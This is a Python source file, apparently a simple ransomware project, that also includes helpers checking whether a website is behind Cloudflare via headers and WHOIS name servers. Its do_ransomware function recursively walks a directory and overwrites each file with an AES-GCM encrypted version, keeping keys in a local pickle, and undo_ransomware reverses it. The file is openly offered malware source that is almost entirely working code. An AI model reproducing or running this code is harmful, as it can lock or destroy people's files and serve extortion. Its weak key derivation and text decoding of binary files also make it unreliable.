import requests
from whois import whois
import hashlib
import glob
import os
from mypackage.crypto import AESEncryptorDecryptor
import pandas as pd
import random
import binascii
import pickle


def get_headers(url, method_name="cloudflare"):
    response = requests.get(url)
    flag = False
    for k, v in response.headers.items():
        if method_name in v:
            print('protected by cloudflare!')
            flag = True
            break
    if not flag:
        print('not protected!')


def get_server_name(url, key_word='cloudflare'):
    w = whois(url)
    for k, v in w.items():
        if k == "name_servers":
            substring_in_list = any(key_word in string for string in v)
            if substring_in_list:
                print("protected by dns")
                break
            else:
                print("not protected!")


def encrypt_decrypt_file(key, path_to_file, action, seed=None, encrypted_msg=None):
    aes = AESEncryptorDecryptor(seed)
    file = path_to_file

    if action == 'encryption':

        with open(file, mode='rb') as new_file:
            content = new_file.read()

        encrypted_content = aes.encrypt_aes_gcm(content.decode(), key)

        with open(file, mode='wb') as out_file:
            #out_file.write(binascii.hexlify(encrypted_content[1]))
            out_file.write(encrypted_content[1])

        return encrypted_content

    else:

        decrypted_content = aes.decrypt_aes_gcm(encrypted_msg, key)

        with open(file, mode='wb') as out_file:
            out_file.write(decrypted_content)

        return decrypted_content


def get_excluded_files(path_to_excluded_files):
    excluded_files_df = pd.read_csv(path_to_excluded_files, sep=';')
    return excluded_files_df


def do_ransomware(path, path_to_excluded_files=None, seed=10):
    if path_to_excluded_files is not None:
        os.chdir(path)
        files = glob.glob("./**/*.*", recursive=True)

        if os.path.exists(path_to_excluded_files+'/encrypted_files.pickle'):

            with open(path_to_excluded_files+'/encrypted_files.pickle', 'rb') as handle:
                excluded_files_list, key_list, encrypted_msg_list = pickle.load(handle)

        else:
            excluded_files_list = []
            key_list = []
            encrypted_msg_list = []

            with open(path_to_excluded_files+'/encrypted_files.pickle', 'wb') as handle:
                pickle.dump((excluded_files_list, key_list, encrypted_msg_list), handle,
                            protocol=pickle.HIGHEST_PROTOCOL)

        for file in files:
            _, extension = os.path.splitext(file.lower())

            if file not in excluded_files_list:
                sha = hashlib.sha256()
                sha.update((file * random.randint(0, 255)).encode())
                key = sha.hexdigest()
                encrypted_msg = encrypt_decrypt_file(key=key, path_to_file=file, action='encryption', seed=seed)

                excluded_files_list.append(file)
                key_list.append(key)
                encrypted_msg_list.append(encrypted_msg)

        with open(path_to_excluded_files+'/encrypted_files.pickle', 'wb') as handle:
            pickle.dump((excluded_files_list, key_list, encrypted_msg_list), handle,
                        protocol=pickle.HIGHEST_PROTOCOL)


def undo_ransomware(path, path_to_excluded_files=None):
    if path_to_excluded_files is not None:

        if os.path.exists(path_to_excluded_files+'/encrypted_files.pickle'):

            with open(path_to_excluded_files+'/encrypted_files.pickle', 'rb') as handle:
                encrypted_files_list, key_list, encrypted_msg_list = pickle.load(handle)

            for file, key, encrypted_msg in zip(encrypted_files_list, key_list, encrypted_msg_list):
                encrypt_decrypt_file(key=key, path_to_file=path+file[1:],
                                     action='decryption', encrypted_msg=encrypted_msg)

            encrypted_files_list = []
            key_list = []
            encrypted_msg_list = []

            with open(path_to_excluded_files+'/encrypted_files.pickle', 'wb') as handle:
                pickle.dump((encrypted_files_list, key_list, encrypted_msg_list), handle,
                            protocol=pickle.HIGHEST_PROTOCOL)


